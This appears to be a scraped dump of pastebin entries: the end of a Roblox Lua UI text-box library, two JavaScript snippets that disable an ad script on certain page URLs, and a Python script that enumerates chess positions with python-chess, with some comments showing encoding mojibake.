		Title.Text = TitleText
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
		
		TextBoxFrame.Name = ""TextBoxFrame""
		TextBoxFrame.Parent = TextInput
		TextBoxFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBoxFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextBoxFrame.BackgroundTransparency = 1.000
		TextBoxFrame.Position = UDim2.new(0.824999988, 0, 0.5, 0)
		TextBoxFrame.Size = UDim2.new(0.300000012, 0, 0.5, 0)
		TextBoxFrame.Image = ""rbxassetid://3570695787""
		TextBoxFrame.ImageColor3 = Color3.fromRGB(0, 0, 0)
		TextBoxFrame.ScaleType = Enum.ScaleType.Slice
		TextBoxFrame.SliceCenter = Rect.new(100, 100, 100, 100)
		TextBoxFrame.SliceScale = 0.050
		
		TextBox.Parent = TextBoxFrame
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.BackgroundTransparency = 1.000
		TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
		TextBox.Size = UDim2.new(0.949999988, 0, 0.949999988, 0)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderText = Placeholder
		TextBox.Text = """"
		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.TextScaled = true
		TextBox.TextSize = 14.000
		TextBox.TextWrapped = true
		
		local FinishedFunction = Function
		
		TextBox.Focused:Connect(function()
			MakeTween(TextBoxFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.325, 0, 0.55, 0)}):Play()
		end)
		
		TextBox.FocusLost:Connect(function()
			coroutine.wrap(FinishedFunction)(TextBox.Text)
			MakeTween(TextBoxFrame, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Size = UDim2.new(0.3, 0, 0.5, 0)}):Play()
		end)
		
		local TextBoxLibrary = {}
		function TextBoxLibrary:Refresh(RefreshTitleText, RefreshPlaceholder, RefreshFunction)
			Title.Text = RefreshTitleText
			TextBox.PlaceholderText = RefreshPlaceholder
			FinishedFunction = RefreshFunction
		end
		return TextBoxLibrary
	end
	
	
	return TabLibrary
end

return Library"
CVrtYKDa,–°–∫—Ä—ã—Ç—å —Ä–µ–∫–ª–∞–º—É –ø–æ –º–∞—Å–∫–µ,Luxup,JavaScript,Friday 21st of June 2024 09:57:36 AM CDT,"// !/blog/ - —ç—Ç–æ –∑–Ω–∞—á–∏—Ç –Ω–µ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å —Ä–µ–∫–ª–∞–º—É, –µ—Å–ª–∏ –≤ –∞–¥—Ä–µ—Å–µ —Å—Å—ã–ª–∫–∏ –Ω–µ—Ç /blog/
(function(){
	if(!/blog/.test(document.location.href))
	{
window.__lxGr__ = window.__lxGr__ ? {conf: window.__lxGr__.conf} : {};	
}
})();

// –ï—Å–ª–∏ –∞–¥—Ä–µ—Å —Å–æ–¥–µ—Ä–∂–∏—Ç –≤ —Å–µ–±–µ /blog/, —Ç–æ —Ä–µ–∫–ª–∞–º–∞ –±—É–¥–µ—Ç —Å–∫—Ä—ã—Ç–∞
(function(){
	if(/blog/.test(document.location.href))
	{
window.__lxGr__ = window.__lxGr__ ? {conf: window.__lxGr__.conf} : {};		
}
})();

//–ï—Å–ª–∏ –Ω—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∞—Å–æ–∫, —Ç–æ –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å –∏—Ö —á–µ—Ä–µ ||
(function(){
	if(/blog/.test(document.location.href)||/another/.test(document.location.href))
	{
window.__lxGr__ = window.__lxGr__ ? {conf: window.__lxGr__.conf} : {};	
}
})();"
Xqyeh5kj,–°–∫—Ä—ã—Ç—å —Ä–µ–∫–ª–∞–º—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö –ø–æ —Å—Å—ã–ª–∫–µ,Luxup,JavaScript,Friday 21st of June 2024 09:54:08 AM CDT,"(function() {
    var currentURL = window.location.href;
    var pagesToDisableAds = [
<!-- –ü–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Å—Å—ã–ª–æ–∫ –Ω–∞ –∫–æ—Ç–æ—Ä—ã—Ö –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –Ω–∞—à–µ–π —Ä–µ–∫–ª–∞–º—ã -->
      ""https://souspark.ru/redakcija/"",
      ""https://souspark.ru/polzovatelskoe-soglashenie/"",
      ""https://souspark.ru/politika-konfidencialnosti/"",
      ""https://souspark.ru/kontakty/""
    ];
    
    if (pagesToDisableAds.includes(currentURL)) {
      window.__lxGr__ = {};
    }
  })();"
0n30YWAF,validni pozice nenalezena,max2201111,Python,Friday 21st of June 2024 09:52:09 AM CDT,"import chess
from itertools import permutations, combinations

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    
    for squares in combinations(all_squares, len(pieces)):
        for square_perm in permutations(squares):
            board = chess.Board(None)
            board.clear_board()
            for piece, square in zip(pieces, square_perm):
                board.set_piece_at(square, chess.Piece.from_symbol(piece))
            if board.is_valid():
                # P≈ôid√°me pozici s b√≠l√Ωm na tahu
                board.turn = chess.WHITE
                unique_fens.add(simplify_fen_string(board.fen()))
                # P≈ôid√°me pozici s ƒçern√Ωm na tahu
                board.turn = chess.BLACK
                unique_fens.add(simplify_fen_string(board.fen()))
    return unique_fens

# Testov√°n√≠ generov√°n√≠ pozic
initial_pieces = ['K', 'k', 'Q']  # M≈Ø≈æete zmƒõnit figury podle pot≈ôeby
unique_positions = generate_chess_positions(initial_pieces)

# Ovƒõ≈ôen√≠, zda je konkr√©tn√≠ pozice vygenerov√°na
test_position = ""8/8/5KQk/8/8/8/8/8 b - - 0 1""
simplified_test_position = simplify_fen_string(test_position)

if simplified_test_position in unique_positions:
    print(""Pozice nalezena!"")
else:
    print(""Pozice nenalezena."")

# V√Ωpis prvn√≠ch 10 pozic
print(""Uk√°zka prvn√≠ch 10 pozic:"")
for i, pos in enumerate(unique_positions):
    if i < 10:
        print(pos)
    else:
        break

print(f""Celkov√Ω poƒçet unik√°tn√≠ch pozic: {len(unique_positions)}"")
"
